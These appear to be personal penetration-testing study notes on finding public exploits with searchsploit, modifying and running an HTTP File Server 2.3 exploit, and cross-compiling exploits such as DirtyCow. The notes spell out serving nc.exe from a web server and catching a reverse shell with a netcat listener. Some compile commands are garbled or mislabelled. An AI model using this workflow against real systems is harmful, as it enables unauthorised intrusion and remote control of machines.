
**Searching for exploits** 

After identifying a potential vulnerability with a target or service running on a target. 

##### Searching public available exploits 
- searching online is risky  (exploit code can be malicious)
- trustworthy databases: Exploit-db & Rapid7
- google search: `   [vulnerability] site:Rapid7.com`
- Github
- packet storm 


#####  Searching with SearchSploit
- Exploit-db comes pre-packed with kali 
- Exploit-db can be queried using SearchSploit 
  

#####  How to use searchsploit  
	- sudo apt-get update && sudo apt-get install exploit-db -y
	- ls -al /usr/share/exploitdb
	- ls -al /usr/share/exploitdb/exploits 

- exploit-db is updated daily  so you need to update using -u: `searchsploit -u `
- `searchsploit` 
- `searchsploit service` 
- `searchsploit service version`
- `searchsploit -m exploit_id-number`
- `searchsploit -m /path `
  copy an exploit in to your current working directory?
- `ls -al `--> `vim exploit_file`
- `searchsploit -c keyword`
- `searchsploit -t title_keyword`
- `searchsploit -e  "keywords/titel"`
- `searchsploit -e  "keywords/titel"`` | grep -e "match with"`
- `searchsploit remote Operating_system service ` 
  search for exploits that match parameter 
- `searchsploit remote windows buffer`
- `searchsploit remote linux service`
- `searchsploit remote wordpress | grep -e "webapps"`
- `remote windows smb -w 
  list online links to download and see exploit code
- `sudo cp /usr/share/exploitdb/exploits/windows/remote/42031.py .`  
  copy exploit manually 


----

### Fixing exploits 
Public exploit code sneeds to be adjusted to own requirements (port, ip etc)

- `nmap -sV ip` 
- `searchsploit HTTP File Server 2.3`
- `searchsploit -m exploit_id` 
  make copy of exploit
- `vim exploit_file`
  Analyze exploit on high level , and check if you need to modify the code (adding ip and port, nc executable)
	  - netcat executable: `cp /usr/share/windows-resources/binaries/nc.exe `
	    
3 windows: 
- (terminal 1) 	running exploit itself - launch exploit
	- ` file.py target_ _ip and service_port`
- (terminal 2) setup webserver to host netcat executable 
	- `python -m SimpleHTTPServer 80` 
- (terminal 3)   netcat listner will be running, obtain command shell session
	- `nc -nvlp 1234`


**Identifying and Preparing Exploits:**
1. Search for available exploits related to the target service (e.g., HTTP File Server 2.3):
	    - `searchsploit HTTP File Server 2.3`
1. If needed, display the details of a specific exploit and make a copy of it (replace `exploit_id` with the actual exploit ID):
	    - `searchsploit -m exploit_id`
2. Copy the netcat (nc.exe) executable to your working directory:
	    - `cp /usr/share/windows-resources/binaries/nc.exe .`
      
**Setting Up Exploit:** 
4. Open the exploit file using a text editor (e.g., Vim):
	- `vim exploit_file`
	 Analyze the exploit code at a high level and check if any modifications are required. This may involve adding the target IP address and service port, as well as specifying the path to the netcat executable if necessary.

**Setting Up Webserver:** 
6. In Terminal 2, set up a web server to host the netcat executable:
	- `python -m SimpleHTTPServer 80
	  `
**Listening for Incoming Connections:** 
7. In Terminal 3, start a netcat listener to capture the shell session:
	- `nc -nvlp 1234`
	This reordering ensures that the identification and preparation of exploits take place before the actual exploit execution, and the netcat setup is done before listening for incoming connections.
	
**Run Exploit**
In Terminal 1, run the exploit script with the target IP address and service port:
- `python exploit_file target_ip service_port`



----




### Cross-Compiling Exploits 
- Exploit code can also be developed in C/C++/c# as result. you need to compile the exploit code in to a PE (portable executable) or binary 
- Cross-compiling is the process of compiling code for a platform other than the one performing the compilation. 

##### Exploit code developed in C

Tools needed: Mingw-w64 en gcc
	install on kali:` sudo apt-get install mingw-w64`
							`sudo apt-get install gcc` 

Download the exploit:
- `searchsploit keyword `
- `searchsploit -m exploit_id`
Recommend to download  32 bit exploit (will run on both 32 and 64 bit systems)

inspect c file (sometimes comments with how to compile are included)
- `vim file`

compile for 64 bit systems
- `i686-w64-mingw32-gcc c_file -o portable_executable_file_name`

compile for 32 bit system: 
- `i686-w64-mingw32-mingw32-gcc c_file -o portable_executable_file_name -lws2_32 
![[Pasted image 20230901111125.png]]


DirtyCow exploit 
- `searchsploit Dirty Cow` 
- `searchsploit -m 40839.c` 
- `gcc -pthread 40839.c -o exploit -lcrypt` 


compilation with gcc is only for linux 
Precompiled binaries can be found on github page of offensive security 
![[Pasted image 20230901111625.png]]






